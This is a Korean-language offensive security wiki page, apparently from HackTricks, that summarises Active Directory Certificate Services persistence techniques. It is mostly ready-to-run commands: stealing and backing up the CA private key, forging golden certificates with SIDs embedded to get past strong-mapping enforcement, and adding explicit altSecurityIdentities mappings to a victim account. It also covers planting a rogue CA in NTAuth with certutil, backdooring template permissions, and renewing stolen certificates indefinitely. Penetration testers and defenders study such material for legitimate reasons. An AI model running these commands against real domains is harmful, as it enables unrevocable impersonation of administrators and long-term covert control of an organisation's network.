# AD CS Domain Persistence

{{#include ../../../banners/hacktricks-training.md}}

**이는 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)에 공유된 domain persistence techniques의 요약입니다**. 자세한 내용은 해당 문서를 확인하세요.<sup>[[5]](#references)</sup>

## 도난한 CA 인증서로 인증서 위조 (Golden Certificate) - DPERSIST1

인증서가 CA 인증서인지 어떻게 확인할 수 있을까요?

다음 조건을 여러 개 충족하면 해당 인증서가 CA 인증서임을 확인할 수 있습니다:<sup>[[5]](#references)</sup>

- 인증서는 CA 서버에 저장되며, 해당 private key는 시스템이 지원하는 경우 시스템의 DPAPI 또는 TPM/HSM과 같은 하드웨어로 보호됩니다.
- 인증서의 Issuer 필드와 Subject 필드가 CA의 distinguished name과 일치합니다.
- CA 인증서에만 "CA Version" extension이 존재합니다.
- 인증서에 Extended Key Usage (EKU) 필드가 없습니다.

이 인증서의 private key를 추출하려면 CA 서버의 `certsrv.msc` tool을 기본 제공 GUI를 통해 사용하는 것이 지원되는 방법입니다. 그럼에도 이 인증서는 시스템에 저장된 다른 인증서와 다르지 않으므로, 추출 시 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2)과 같은 방법을 적용할 수 있습니다.

다음 명령을 사용하여 Certipy로 인증서와 private key를 얻을 수도 있습니다:<sup>[[2]](#references)</sup>
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
`.pfx` 형식의 CA certificate와 private key를 획득하면 [ForgeCert](https://github.com/GhostPack/ForgeCert)와 같은 tools를 사용하여 유효한 certificates를 생성할 수 있습니다:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 인증서 위조 대상으로 지정된 사용자는 프로세스가 성공하려면 활성 상태이며 Active Directory에서 인증할 수 있어야 합니다. krbtgt와 같은 특수 계정의 인증서를 위조하는 것은 효과가 없습니다.

이 위조된 인증서는 지정된 만료일까지 **유효**하며, **루트 CA 인증서가 유효한 동안**에도 유효합니다(일반적으로 5년에서 **10년 이상**). 또한 **머신**에도 유효하므로, **S4U2Self**와 결합하면 공격자는 CA 인증서가 유효한 동안 **모든 도메인 머신에 대한 persistence를 유지**할 수 있습니다.\
또한 이 방법으로 **생성된 인증서**는 CA가 이를 인식하지 못하므로 **revoke할 수 없습니다**.

### Strong Certificate Mapping Enforcement(2025년 이후) 환경에서 운영

2025년 2월 11일(KB5014754 rollout 이후)부터 domain controller는 인증서 매핑에 대해 기본적으로 **Full Enforcement**를 적용합니다. 실제로 이는 위조된 인증서가 다음 중 하나를 충족해야 함을 의미합니다.

- 대상 계정에 대한 strong binding을 포함하거나(예: SID security extension), 또는
- 대상 object의 `altSecurityIdentities` attribute에 strong explicit mapping이 설정되어 있어야 합니다.<sup>[[1]](#references)</sup>

persistence를 위한 신뢰할 수 있는 접근 방식은 탈취한 Enterprise CA에 연결된 위조 인증서를 발급한 후 victim principal에 strong explicit mapping을 추가하는 것입니다:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- SID security extension이 포함된 위조 인증서를 생성할 수 있다면, Full Enforcement에서도 해당 인증서는 암시적으로 매핑됩니다. 그렇지 않으면 명시적 strong mappings를 우선 사용하세요. 명시적 mappings에 대한 자세한 내용은 [account-persistence](account-persistence.md)를 참조하세요.
- 철회는 여기서 방어자에게 도움이 되지 않습니다. 위조 인증서는 CA database에 존재하지 않으므로 철회할 수 없습니다.

#### Full-Enforcement compatible forging (SID-aware)

업데이트된 tooling을 사용하면 SID를 직접 삽입할 수 있으므로, DC가 weak mappings를 거부하는 경우에도 golden certificates를 계속 사용할 수 있습니다:<sup>[[3]](#references)</sup>
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
SID를 임베드하면 모니터링 대상일 수 있는 `altSecurityIdentities`를 수정할 필요 없이 strong mapping 검사를 계속 충족할 수 있습니다.

## Rogue CA Certificates 신뢰 - DPERSIST2

`NTAuthCertificates` object는 Active Directory (AD)가 사용하는 하나 이상의 **CA certificates**를 `cacertificate` attribute에 포함하도록 정의되어 있습니다. **domain controller**의 verification process는 authenticating **certificate**의 Issuer field에 지정된 **CA**와 일치하는 entry가 있는지 `NTAuthCertificates` object에서 확인하는 방식으로 이루어집니다. 일치하는 항목이 있으면 authentication이 진행됩니다.<sup>[[5]](#references)</sup>

공격자는 이 AD object를 제어할 수 있는 경우 self-signed CA certificate를 `NTAuthCertificates` object에 추가할 수 있습니다. 일반적으로 **Enterprise Admin** group의 members와 **forest root’s domain**의 **Domain Admins** 또는 **Administrators**에게만 이 object를 수정할 수 있는 permission이 부여됩니다. 이들은 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` command를 사용하거나 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)을 사용하여 `NTAuthCertificates` object를 편집할 수 있습니다.

이 technique에 유용한 추가 commands:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
이 capability는 ForgeCert를 사용하여 동적으로 certificates를 생성하는 앞서 설명한 method와 함께 사용할 때 특히 relevant합니다.

> 2025년 이후의 mapping 고려 사항: rogue CA를 NTAuth에 배치하는 것만으로는 발급 CA에 대한 trust만 설정됩니다. DC가 **Full Enforcement** 상태일 때 logon에 leaf certificates를 사용하려면, leaf에 SID security extension이 포함되어 있거나 대상 object에 강력한 explicit mapping이 있어야 합니다(예: `altSecurityIdentities`의 Issuer+Serial). 자세한 내용은 {{#ref}}account-persistence.md{{#endref}}를 참조하세요.

## 악의적인 Misconfiguration - DPERSIST3

**persistence**를 위해 **AD CS** components의 **security descriptor**를 수정할 기회는 많습니다. "[Domain Escalation](domain-escalation.md)" section에서 설명한 modifications는 elevated access를 가진 attacker가 악의적으로 구현할 수 있습니다. 여기에는 다음과 같은 민감한 components에 "control rights"(예: WriteOwner/WriteDACL/etc.)를 추가하는 작업이 포함됩니다:<sup>[[5]](#references)</sup>

- **CA server의 AD computer** object
- **CA server의 RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 내의 모든 **descendant AD object 또는 container**(예: Certificate Templates container, Certification Authorities container, NTAuthCertificates object 등)
- 기본적으로 또는 organization에 의해 **AD CS를 제어할 권한이 위임된 AD groups**(예: 기본 제공 Cert Publishers group 및 해당 group의 모든 members)

악의적인 구현의 예로, domain에서 **elevated permissions**를 보유한 attacker가 기본 **`User`** certificate template에 **`WriteOwner`** permission을 추가하고, 해당 권한의 principal로 attacker 자신을 지정하는 경우를 들 수 있습니다. 이를 exploit하려면 attacker는 먼저 **`User`** template의 ownership을 자신으로 변경합니다. 그런 다음 template에서 **`mspki-certificate-name-flag`**를 **1**로 설정하여 **`ENROLLEE_SUPPLIES_SUBJECT`**를 활성화하고, 사용자가 request에 Subject Alternative Name을 제공할 수 있도록 합니다. 이후 attacker는 해당 **template**을 사용하여 **enroll**하고, alternative name으로 **domain administrator**의 이름을 선택한 다음, 획득한 certificate를 DA로 authentication하는 데 사용할 수 있습니다.

attacker가 장기적인 domain persistence를 위해 설정할 수 있는 practical knobs입니다(전체 details 및 detection은 {{#ref}}domain-escalation.md{{#endref}} 참조).

- requester가 SAN을 지정할 수 있도록 허용하는 CA policy flags(예: `EDITF_ATTRIBUTESUBJECTALTNAME2` 활성화). 이를 통해 ESC1과 유사한 paths를 계속 exploit할 수 있습니다.
- authentication-capable issuance를 허용하는 template DACL 또는 settings(예: Client Authentication EKU 추가, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 활성화).
- defender가 cleanup을 시도하더라도 rogue issuers를 지속적으로 다시 추가할 수 있도록 `NTAuthCertificates` object 또는 CA containers를 제어.

> [!TIP]
> KB5014754 이후 hardened environments에서는 이러한 misconfigurations를 explicit strong mappings(`altSecurityIdentities`)과 결합하면 DC가 strong mapping을 enforce하는 경우에도 발급되거나 forged된 certificates를 계속 사용할 수 있습니다.

### persistence를 위한 Certificate renewal abuse (ESC14)

authentication-capable certificate(또는 Enrollment Agent certificate)를 compromise하면, 발급 template이 계속 published 상태이고 CA가 여전히 issuer chain을 trust하는 한 이를 **indefinitely renew**할 수 있습니다. Renewal은 original identity bindings를 유지하면서 validity를 연장하므로, template을 수정하거나 CA를 republish하지 않는 한 eviction이 어려워집니다.<sup>[[4]](#references)</sup>
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
도메인 컨트롤러가 **Full Enforcement** 상태인 경우, `-sid <victim SID>`를 추가하거나(또는 SID security extension이 여전히 포함된 template을 사용하여) `altSecurityIdentities`를 건드리지 않고도 갱신된 leaf certificate가 계속 강력하게 매핑되도록 합니다. CA admin rights를 가진 공격자는 자신에게 certificate를 발급하기 전에 `policy\RenewalValidityPeriodUnits`를 조정하여 갱신된 lifetime을 늘릴 수도 있습니다.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
